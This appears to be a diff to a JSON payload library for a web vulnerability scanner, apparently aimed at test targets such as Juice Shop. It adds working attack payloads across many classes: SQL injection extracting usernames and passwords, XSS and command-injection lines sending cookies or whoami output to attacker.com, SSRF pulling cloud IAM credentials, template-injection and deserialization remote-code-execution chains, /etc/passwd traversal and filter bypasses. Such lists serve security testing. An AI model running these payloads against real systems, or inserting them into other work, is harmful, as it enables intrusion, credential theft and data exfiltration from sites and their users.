@@ -20,20 +20,43 @@
       "' UNION SELECT null,null--",
       "' UNION SELECT null,null,null--",
       "' UNION SELECT 1,2,3--",
-      "' UNION SELECT username,password FROM users--"
+      "' UNION SELECT username,password FROM users--",
+      "' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--"
     ],
     "detection_signatures": ["UNION", "column", "number of columns"]
   },
   {
-    "name": "sqli_time_based",
+    "name": "sqli_time_based_blind",
     "class": "sqli",
     "payloads": [
       "' AND SLEEP(3)--",
       "' OR SLEEP(3)--",
       "'; WAITFOR DELAY '0:0:3'--",
-      "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
+      "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
+      "1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--",
+      "' AND BENCHMARK(5000000,SHA1('test'))--"
     ],
     "detection_signatures": ["response_time > 3000ms"]
+  },
+  {
+    "name": "sqli_second_order",
+    "class": "sqli",
+    "payloads": [
+      "admin'-- (register, then login triggers injection)",
+      "test'); INSERT INTO users VALUES('hacker','admin')--",
+      "'; UPDATE users SET role='admin' WHERE username='hacker'--"
+    ],
+    "detection_signatures": ["stored payload triggers on subsequent query"]
+  },
+  {
+    "name": "sqli_out_of_band",
+    "class": "sqli",
+    "payloads": [
+      "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
+      "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\'))--",
+      "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--"
+    ],
+    "detection_signatures": ["DNS/HTTP callback received"]
   },
   {
     "name": "xss_reflected",
@@ -53,7 +76,9 @@
     "class": "xss",
     "payloads": [
       "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
-      "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>"
+      "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>",
+      "<iframe src=\"javascript:alert(document.cookie)\">",
+      "<object data=\"javascript:alert('XSS')\">"
     ],
     "detection_signatures": ["payload persists across requests"]
   },
@@ -63,9 +88,24 @@
     "payloads": [
       "#<img src=x onerror=alert(1)>",
       "javascript:alert(document.domain)//",
-      "'-alert(1)-'"
+      "'-alert(1)-'",
+      "\"><img src=x onerror=alert(1)>",
+      "{{constructor.constructor('alert(1)')()}}"
     ],
     "detection_signatures": ["payload in DOM without server reflection"]
+  },
+  {
+    "name": "xss_filter_bypass",
+    "class": "xss",
+    "payloads": [
+      "<scr<script>ipt>alert(1)</scr</script>ipt>",
+      "<svg><animate onbegin=alert(1) attributeName=x>",
+      "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=x onerror=alert(1)>\">",
+      "jaVaScRiPt:alert(1)",
+      "<details open ontoggle=alert(1)>",
+      "<marquee onstart=alert(1)>"
+    ],
+    "detection_signatures": ["WAF bypass, payload executes"]
   },
   {
     "name": "idor_numeric",
@@ -83,6 +123,16 @@
     "detection_signatures": ["data returned for other user UUID"]
   },
   {
+    "name": "idor_parameter_tampering",
+    "class": "idor",
+    "payloads": [
+      "user_id=1&user_id=2 (HPP)",
+      "userId[]=1&userId[]=2",
+      "id=2&admin=true"
+    ],
+    "detection_signatures": ["access to other users resources without authz check"]
+  },
+  {
     "name": "broken_auth_default_creds",
     "class": "broken_auth",
     "payloads": [
@@ -90,7 +140,9 @@
       "admin:admin123",
       "admin:password",
       "test:test",
-      "admin@juice-sh.op:admin123"
+      "admin@juice-sh.op:admin123",
+      "root:toor",
+      "admin:P@ssw0rd"
     ],
     "detection_signatures": ["token in response", "200 status", "session cookie set"]
   },
@@ -108,36 +160,219 @@
     "payloads": [
       "' OR 1=1--",
       "admin'--",
-      "' OR '1'='1'--"
+      "' OR '1'='1'--",
+      "admin') OR ('1'='1'--",
+      "' UNION SELECT 1,'admin','admin'--"
     ],
     "detection_signatures": ["authentication bypassed", "token returned"]
   },
   {
-    "name": "info_disclosure_debug",
-    "class": "info_disclosure",
+    "name": "jwt_algorithm_confusion",
+    "class": "broken_auth",
     "payloads": [
-      "/.env",
-      "/debug",
-      "/api/debug",
-      "/swagger.json",
-      "/api-docs",
-      "/.git/config",
-      "/server-status",
-      "/phpinfo.php"
+      "Change RS256 to HS256, sign with public key",
+      "alg:none with empty signature",
+      "JKU/X5U header pointing to attacker-controlled JWKS",
+      "kid path traversal: ../../dev/null"
     ],
-    "detection_signatures": ["sensitive data in response", "stack traces", "credentials"]
+    "detection_signatures": ["privilege escalation via JWT manipulation"]
   },
   {
-    "name": "info_disclosure_error",
-    "class": "info_disclosure",
+    "name": "ssrf_basic",
+    "class": "ssrf",
     "payloads": [
-      "/%00",
-      "/undefined",
-      "/null",
-      "/?id=",
-      "/api/undefined"
+      "http://127.0.0.1:80",
+      "http://localhost:22",
+      "http://169.254.169.254/latest/meta-data/",
+      "file:///etc/passwd",
+      "http://[::1]:80",
+      "http://0x7f000001/",
+      "http://2130706433/",
+      "http://metadata.google.internal/computeMetadata/v1/"
     ],
-    "detection_signatures": ["stack trace", "internal paths", "database details"]
+    "detection_signatures": ["internal service response", "cloud metadata"]
+  },
+  {
+    "name": "ssrf_filter_bypass",
+    "class": "ssrf",
+    "payloads": [
+      "http://127.1/",
+      "http://0177.0.0.1/",
+      "http://localhost%23@attacker.com/",
+      "http://attacker.com#@127.0.0.1/",
+      "http://127.0.0.1.nip.io/",
+      "http://spoofed.burpcollaborator.net/",
+      "dict://127.0.0.1:6379/info",
+      "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
+    ],
+    "detection_signatures": ["bypass IP/domain filter", "access internal via DNS rebinding"]
+  },
+  {
+    "name": "ssrf_cloud_metadata",
+    "class": "ssrf",
+    "payloads": [
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+      "http://169.254.169.254/metadata/v1.json",
+      "http://100.100.100.200/latest/meta-data/ (Alibaba)",
+      "http://169.254.169.254/opc/v2/instance/ (Oracle)"
+    ],
+    "detection_signatures": ["AWS/GCP/Azure credentials returned"]
+  },
+  {
+    "name": "prototype_pollution_server",
+    "class": "prototype_pollution",
+    "payloads": [
+      "{\"__proto__\":{\"isAdmin\":true}}",
+      "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+      "{\"__proto__\":{\"shell\":\"/proc/self/exe\",\"NODE_OPTIONS\":\"--require /proc/self/cmdline\"}}",
+      "{\"__proto__\":{\"status\":200,\"body\":\"polluted\"}}",
+      "{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp2\"}}"
+    ],
+    "detection_signatures": ["property inherited via prototype chain", "RCE via gadget"]
+  },
+  {
+    "name": "prototype_pollution_client",
+    "class": "prototype_pollution",
+    "payloads": [
+      "Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'",
+      "?__proto__[src]=data:,alert(1)&__proto__[onload]=1",
+      "#__proto__[value]=XSS"
+    ],
+    "detection_signatures": ["DOM element modified via polluted prototype"]
+  },
+  {
+    "name": "ssti_jinja2",
+    "class": "ssti",
+    "payloads": [
+      "{{7*7}}",
+      "{{config}}",
+      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+      "{{''.__class__.__mro__[1].__subclasses__()}}",
+      "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}"
+    ],
+    "detection_signatures": ["49 rendered", "config object dumped", "command output"]
+  },
+  {
+    "name": "ssti_node",
+    "class": "ssti",
+    "payloads": [
+      "{{constructor.constructor('return this')()}}",
+      "#{global.process.mainModule.require('child_process').execSync('id')}",
+      "${require('child_process').execSync('id')}",
+      "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"
+    ],
+    "detection_signatures": ["RCE via template engine (pug, nunjucks, ejs)"]
+  },
+  {
+    "name": "nosql_injection_auth_bypass",
+    "class": "nosql_injection",
+    "payloads": [
+      "{\"email\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
+      "{\"email\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}",
+      "{\"email\":{\"$regex\":\"admin\"},\"password\":{\"$ne\":\"\"}}",
+      "{\"$where\":\"this.password.match(/.*/)\"}"
+    ],
+    "detection_signatures": ["authentication bypass", "data extraction"]
+  },
+  {
+    "name": "nosql_injection_data_extraction",
+    "class": "nosql_injection",
+    "payloads": [
+      "{\"$where\":\"sleep(3000)\"}",
+      "{\"email\":{\"$regex\":\"^a\"}}",
+      "{\"password\":{\"$regex\":\"^[a-z]\"}}",
+      "[$ne]=1"
+    ],
+    "detection_signatures": ["blind extraction via regex/timing", "operator injection"]
+  },
+  {
+    "name": "path_traversal_basic",
+    "class": "path_traversal",
+    "payloads": [
+      "../../../etc/passwd",
+      "....//....//....//etc/passwd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "..%252f..%252f..%252fetc%252fpasswd",
+      "/etc/passwd%00.jpg",
+      "..\\..\\..\\windows\\system.ini"
+    ],
+    "detection_signatures": ["file content returned", "root:x:0:0"]
+  },
+  {
+    "name": "path_traversal_filter_bypass",
+    "class": "path_traversal",
+    "payloads": [
+      "....//....//....//etc/passwd",
+      "..%c0%af..%c0%af..%c0%afetc/passwd",
+      "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+      "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "/..%2f..%2f..%2f..%2f..%2fetc/passwd"
+    ],
+    "detection_signatures": ["double encoding bypass", "unicode bypass"]
+  },
+  {
+    "name": "race_condition_balance",
+    "class": "race_condition",
+    "payloads": [
+      "Send 50x concurrent purchase request (TOCTOU on balance check)",
+      "Parallel coupon redemption (same code, multiple accounts)",
+      "Concurrent withdraw requests before balance update",
+      "Simultaneous password reset token generation"
+    ],
+    "detection_signatures": ["balance goes negative", "coupon used multiple times", "double-spend"]
+  },
+  {
+    "name": "race_condition_limit_bypass",
+    "class": "race_condition",
+    "payloads": [
+      "Burst 100 requests to rate-limited endpoint",
+      "Concurrent file upload beyond quota",
+      "Parallel vote/like submissions",
+      "Simultaneous account creation (unique email bypass)"
+    ],
+    "detection_signatures": ["rate limit exceeded without blocking", "resource limit bypassed"]
+  },
+  {
+    "name": "mass_assignment_privilege_escalation",
+    "class": "mass_assignment",
+    "payloads": [
+      "{\"username\":\"user\",\"role\":\"admin\"}",
+      "{\"email\":\"a@b.com\",\"isAdmin\":true}",
+      "{\"name\":\"test\",\"verified\":true,\"balance\":999999}",
+      "{\"profile\":{\"name\":\"x\"},\"permissions\":[\"admin\",\"superuser\"]}"
+    ],
+    "detection_signatures": ["role/privilege field accepted and saved", "unauthorized field update"]
+  },
+  {
+    "name": "insecure_deserialization_java",
+    "class": "unsafe_deserialization",
+    "payloads": [
+      "ysoserial CommonsCollections1 'id'",
+      "rO0AB serialized object with Runtime.exec gadget",
+      "Apache Commons BeanUtils chain",
+      "Spring Framework PropertyPathFactoryBean"
+    ],
+    "detection_signatures": ["command execution via deserialized object"]
+  },
+  {
+    "name": "insecure_deserialization_node",
+    "class": "unsafe_deserialization",
+    "payloads": [
+      "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+      "{\"__proto__\":{\"toString\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}\"}}"
+    ],
+    "detection_signatures": ["command execution", "serialization error with code execution"]
+  },
+  {
+    "name": "insecure_deserialization_python",
+    "class": "unsafe_deserialization",
+    "payloads": [
+      "cos\\nsystem\\n(S'id'\\ntR.",
+      "cPickle payload with __reduce__",
+      "yaml.load with !!python/object/apply:os.system ['id']"
+    ],
+    "detection_signatures": ["pickle/yaml deserialization triggers command"]
   },
   {
     "name": "command_injection_basic",
@@ -147,39 +382,121 @@
       "| cat /etc/passwd",
       "$(whoami)",
       "`id`",
-      "; ping -c 3 127.0.0.1"
+      "; ping -c 3 127.0.0.1",
+      "|| curl attacker.com",
+      "&& id"
     ],
     "detection_signatures": ["command output in response", "response time indicates execution"]
   },
   {
-    "name": "deserialization_node",
-    "class": "unsafe_deserialization",
+    "name": "command_injection_blind",
+    "class": "command_injection",
     "payloads": [
-      "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
-      "{\"__proto__\":{\"toString\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}\"}}  "
+      "; sleep 5",
+      "| sleep 5",
+      "`sleep 5`",
+      "$(sleep 5)",
+      "; nslookup attacker.com",
+      "; curl http://attacker.com/$(whoami)"
     ],
-    "detection_signatures": ["command execution", "serialization error with code execution"]
+    "detection_signatures": ["response delay", "DNS/HTTP callback"]
   },
   {
-    "name": "path_traversal",
-    "class": "info_disclosure",
+    "name": "command_injection_filter_bypass",
+    "class": "command_injection",
     "payloads": [
-      "../../../etc/passwd",
-      "....//....//....//etc/passwd",
-      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-      "/etc/passwd%00.jpg"
+      ";${IFS}cat${IFS}/etc/passwd",
+      "$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
+      "{cat,/etc/passwd}",
+      "c''at /e''tc/pas''swd",
+      "c\\at /e\\tc/pas\\swd"
     ],
-    "detection_signatures": ["file content returned", "root:x:0:0"]
+    "detection_signatures": ["filter bypass via encoding/splitting"]
   },
   {
-    "name": "ssrf_basic",
+    "name": "open_redirect",
+    "class": "open_redirect",
+    "payloads": [
+      "//evil.com",
+      "https://evil.com",
+      "/\\evil.com",
+      "//evil.com%2f%2f",
+      "////evil.com",
+      "https:evil.com",
+      "java%0d%0ascript:alert(1)"
+    ],
+    "detection_signatures": ["302 redirect to external domain", "Location header to attacker"]
+  },
+  {
+    "name": "insecure_crypto_weak_keys",
+    "class": "insecure_crypto",
+    "payloads": [
+      "JWT signed with 'secret'",
+      "API key = base64('admin:admin')",
+      "AES with hardcoded key '0123456789abcdef'",
+      "RSA-512 key (factorable)"
+    ],
+    "detection_signatures": ["predictable key material", "brute-forceable secret"]
+  },
+  {
+    "name": "graphql_introspection",
     "class": "info_disclosure",
     "payloads": [
-      "http://127.0.0.1:80",
-      "http://localhost:22",
-      "http://169.254.169.254/latest/meta-data/",
-      "file:///etc/passwd"
+      "{__schema{types{name,fields{name,type{name}}}}}",
+      "{__type(name:\"User\"){fields{name}}}",
+      "query{__schema{queryType{fields{name,description}}}}"
     ],
-    "detection_signatures": ["internal service response", "cloud metadata"]
+    "detection_signatures": ["full schema exposed", "internal types visible"]
+  },
+  {
+    "name": "graphql_injection",
+    "class": "sqli",
+    "payloads": [
+      "{user(id:\"1 OR 1=1\"){email,password}}",
+      "{users(filter:{role:{eq:\"admin\"}}){id,email}}",
+      "mutation{updateUser(id:1,input:{role:\"admin\"}){id}}"
+    ],
+    "detection_signatures": ["data from other users", "mutation accepted without authz"]
+  },
+  {
+    "name": "websocket_hijacking",
+    "class": "broken_auth",
+    "payloads": [
+      "Cross-origin WebSocket connection without origin check",
+      "WS message replay after session expiry",
+      "No CSRF token on WS upgrade request"
+    ],
+    "detection_signatures": ["WebSocket accepts cross-origin", "no auth on upgrade"]
+  },
+  {
+    "name": "http_request_smuggling",
+    "class": "info_disclosure",
+    "payloads": [
+      "Transfer-Encoding: chunked + Content-Length mismatch (CL.TE)",
+      "Content-Length: 0 + Transfer-Encoding: chunked (TE.CL)",
+      "Transfer-Encoding: xchunked (TE.TE obfuscation)"
+    ],
+    "detection_signatures": ["request boundary desync", "response queue poisoning"]
+  },
+  {
+    "name": "cache_poisoning",
+    "class": "xss",
+    "payloads": [
+      "X-Forwarded-Host: evil.com (poison CDN cache)",
+      "X-Original-URL: /admin (cache deception)",
+      "X-Forwarded-Scheme: nothttps"
+    ],
+    "detection_signatures": ["cached response serves attacker content to other users"]
+  },
+  {
+    "name": "business_logic_flaw",
+    "class": "broken_auth",
+    "payloads": [
+      "Negative quantity in cart (-1 item = credit)",
+      "Apply coupon after payment confirmation",
+      "Skip payment step via direct API call to order confirmation",
+      "Change email to admin@target.com during password reset flow"
+    ],
+    "detection_signatures": ["financial gain", "privilege escalation via workflow manipulation"]
   }
 ]
